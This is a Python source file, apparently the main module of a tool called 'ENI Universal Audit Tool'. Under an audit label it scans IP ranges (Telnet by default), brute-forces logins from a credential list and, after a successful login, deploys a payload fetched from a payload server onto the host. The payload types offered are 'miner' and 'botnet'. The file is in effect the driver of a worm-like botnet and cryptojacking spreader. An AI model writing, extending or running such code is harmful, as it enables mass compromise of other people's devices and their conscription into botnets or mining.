"""
ENI Universal Audit Tool v6.3 – main entry point.
"""

import asyncio
import argparse
import logging
import sys
import signal
from typing import Set

from .config import load_config, CONFIG
from .database import Database
from .scanner import AsyncScanner
from .auth import AsyncAuthEngine
from .deploy import PayloadDeployer
from .probes import (
    ASYNC_PROBE_MAP,
    AsyncHttpProbe,
    AsyncHttpsProbe,
    AsyncSnmpProbe,
)
from .utils import check_dependencies, oui_registry, set_global_proxy
from .exporters import export_results

logger = logging.getLogger('eni_scanner')


async def main_async():
    parser = argparse.ArgumentParser(description="ENI Universal Audit Tool v6.3")
    parser.add_argument("--cidr", help="Subnet (IPv4 or IPv6 with --6)")
    parser.add_argument("--6", dest="ipv6", action="store_true", help="Use IPv6")
    parser.add_argument("--targets", help="File with list of IPs")
    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent tasks")
    parser.add_argument("--timeout", type=float, default=2.0, help="Timeout in seconds")
    parser.add_argument("--rate", type=float, help="Requests per second limit")
    parser.add_argument("--services", help="Comma-separated list of services")
    parser.add_argument("--ports", help="Comma-separated list of ports")
    parser.add_argument("--banner", action="store_true", help="Collect banners")
    parser.add_argument("--proxy", help="Proxy (socks5://user:pass@host:port)")
    parser.add_argument("--local", action="store_true", help="Try to get MAC addresses (local network)")
    parser.add_argument("--format", choices=["txt","csv","json","xlsx","xml"], default="txt")
    parser.add_argument("--output", help="Output file")
    parser.add_argument("--db", help="SQLite database path")
    parser.add_argument("--passwords", help="File with user:pass credentials")
    parser.add_argument("--authorized", action="store_true", help="Allow brute force")
    parser.add_argument("--max-attempts", type=int, default=10)
    parser.add_argument("--auth-rate", type=float, help="Attempts per second limit (brute)")
    parser.add_argument("--exclude-ips", help="File with IPs to exclude")
    parser.add_argument("--exclude-ports", help="Comma-separated ports to exclude")
    parser.add_argument("--update-oui", action="store_true", help="Update OUI from IEEE")
    parser.add_argument("--snmp-communities", help="File with SNMP communities")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--payload-server", help="URL of the payload server")
    parser.add_argument("--deploy", action="store_true", help="Automatically deploy payload after successful auth")
    parser.add_argument("--payload-type", choices=["miner", "botnet"], default="miner")
    parser.add_argument("--payload-path", help="Path to save payload on target")
    parser.add_argument("--resume", action="store_true", help="Resume scanning from last saved state")
    parser.add_argument("--config", default="config.yaml", help="Path to configuration file")

    args = parser.parse_args()
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.update_oui:
        oui_registry.update_from_ieee()
        return

    check_dependencies()

    # Load exclusions
    exclude_ips = set()
    if args.exclude_ips:
        try:
            with open(args.exclude_ips) as f:
                exclude_ips = set(line.strip() for line in f if line.strip())
        except Exception as e:
            logger.error("Error loading exclude-ips: %s", e)
    exclude_ports = set()
    if args.exclude_ports:
        for p in args.exclude_ports.split(','):
            try:
                exclude_ports.add(int(p.strip()))
            except:
                pass

    db = None
    if args.db:
        try:
            db = Database(args.db)
            logger.info("Database: %s", args.db)
        except Exception as e:
            logger.error("Database error: %s", e)
            return

    # Build target IP list
    import ipaddress
    ips = []
    if args.cidr:
        try:
            net = ipaddress.ip_network(args.cidr, strict=False)
            if args.ipv6:
                if net.version != 6:
                    logger.error("--6 specified but CIDR is not IPv6")
                    return
                ips = [str(ip) for ip in net.hosts()]
            else:
                if net.version != 4:
                    logger.error("CIDR is not IPv4, use --6 for IPv6")
                    return
                ips = [str(ip) for ip in net.hosts()]
        except ValueError as e:
            logger.error("Invalid CIDR: %s", e)
            return
    elif args.targets:
        try:
            with open(args.targets) as f:
                ips = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            logger.error("File %s not found", args.targets)
            return
    else:
        logger.error("Specify --cidr or --targets")
        return

    # Build probes list
    service_ports = CONFIG['services']
    active_probes = []

    if args.ports:
        for pt in args.ports.split(","):
            try:
                port = int(pt.strip())
                active_probes.append((port, ASYNC_PROBE_MAP["port"]))
            except:
                logger.error("Invalid port: %s", pt)
    elif args.services:
        for s in args.services.split(","):
            s = s.strip().lower()
            if s in service_ports:
                if s == "http":
                    active_probes.append((service_ports[s], AsyncHttpProbe))
                elif s == "https":
                    active_probes.append((service_ports[s], AsyncHttpsProbe))
                elif s == "snmp":
                    communities = None
                    if args.snmp_communities:
                        try:
                            with open(args.snmp_communities) as f:
                                communities = [l.strip() for l in f if l.strip()]
                        except Exception as e:
                            logger.error("Error loading SNMP communities: %s", e)
                    probe_kwargs = {
                        "timeout": args.timeout,
                        "use_proxy": bool(args.proxy),
                        "grab_banner": args.banner,
                        "proxy_url": args.proxy,
                        "communities": communities
                    }
                    active_probes.append((service_ports[s], AsyncSnmpProbe(**probe_kwargs)))
                elif s in ASYNC_PROBE_MAP:
                    active_probes.append((service_ports[s], ASYNC_PROBE_MAP[s]))
                else:
                    logger.error("Unknown service: %s", s)
            else:
                logger.error("Unknown service: %s", s)
    else:
        active_probes.append((23, ASYNC_PROBE_MAP["port"]))

    # Set up global proxy if needed
    if args.proxy:
        set_global_proxy(args.proxy)

    logger.info("Scanning %d hosts", len(ips))
    scanner = AsyncScanner(args, db, exclude_ips, exclude_ports)

    # Signal handling (Unix)
    def signal_handler():
        logger.info("Interrupt signal received, stopping...")
        scanner.stop = True
    if hasattr(asyncio.get_running_loop(), 'add_signal_handler'):
        loop = asyncio.get_running_loop()
        loop.add_signal_handler(signal.SIGINT, signal_handler)

    try:
        results = await scanner.run(ips, active_probes)
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        scanner.stop = True
        await asyncio.sleep(1)
    except Exception as e:
        logger.exception("Error during scanning: %s", e)
    finally:
        if hasattr(asyncio.get_running_loop(), 'add_signal_handler'):
            loop = asyncio.get_running_loop()
            try:
                loop.remove_signal_handler(signal.SIGINT)
            except:
                pass

    open_targets = [r for r in results if r.status == "open"]
    logger.info("Scan finished. Open ports found: %d", len(open_targets))

    # Export results
    if args.output:
        export_results(results, args.output, args.format)

    # Brute force with deployment
    if args.passwords and args.authorized and open_targets:
        creds = []
        try:
            with open(args.passwords, "r", encoding="utf-8") as f:
                for line in f:
                    if ":" in line:
                        creds.append(tuple(line.strip().split(":", 1)))
            if creds:
                deployer = None
                session = None
                try:
                    if args.deploy and args.payload_server:
                        import aiohttp
                        connector = aiohttp.TCPConnector(ssl=False)
                        session = aiohttp.ClientSession(connector=connector)
                        deployer = PayloadDeployer(args, db, session)
                    auth_engine = AsyncAuthEngine(args, db, deployer, session)
                    await auth_engine.run_brute(open_targets, creds)
                finally:
                    if session:
                        await session.close()
                    if auth_engine:
                        await auth_engine.close()
            else:
                logger.error("Dictionary is empty or has invalid format")
        except FileNotFoundError:
            logger.error("Dictionary file %s not found", args.passwords)


def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        logger.info("Shutdown by Ctrl+C")


if __name__ == "__main__":
    main()
